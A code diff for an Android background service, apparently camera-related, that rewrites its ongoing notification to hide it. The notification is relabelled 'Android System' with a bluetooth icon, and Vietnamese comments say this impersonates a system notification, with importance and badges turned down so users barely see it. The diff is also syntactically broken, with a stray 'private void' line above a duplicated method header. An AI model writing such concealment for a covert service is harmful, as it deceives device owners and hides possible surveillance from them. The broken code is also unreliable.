@@ -81,16 +81,20 @@ public class OpticalPhantomService extends Service {
         }, null);
     }
 
-    private void createNotificationChannel() {
-        NotificationChannel channel = new NotificationChannel("OMEGA_VISION", "Omega Retina", NotificationManager.IMPORTANCE_LOW);
+    private void 
+        private void createNotificationChannel() {
+        // IMPORTANCE_MIN: Chỉ hiện dấu chấm nhỏ trong khay, KHÔNG hiện trên thanh Status Bar, KHÔNG có tiếng
+        NotificationChannel channel = new NotificationChannel("OMEGA_VISION", "System Sync", NotificationManager.IMPORTANCE_MIN);
+        channel.setShowBadge(false); // Tắt badge icon trên icon app
         getSystemService(NotificationManager.class).createNotificationChannel(channel);
     }
 
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, "OMEGA_VISION")
-                .setContentTitle("Omega System")
-                .setContentText("Micro-Stepping Active")
-                .setSmallIcon(android.R.drawable.ic_menu_camera)
+                .setContentTitle("Android System") // Giả danh thông báo hệ thống
+                .setContentText("Syncing background processes...")
+                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth) // Icon bluetooth giả mạo
+                .setPriority(NotificationCompat.PRIORITY_MIN) // Mức ưu tiên thấp nhất
                 .build();
     }
 
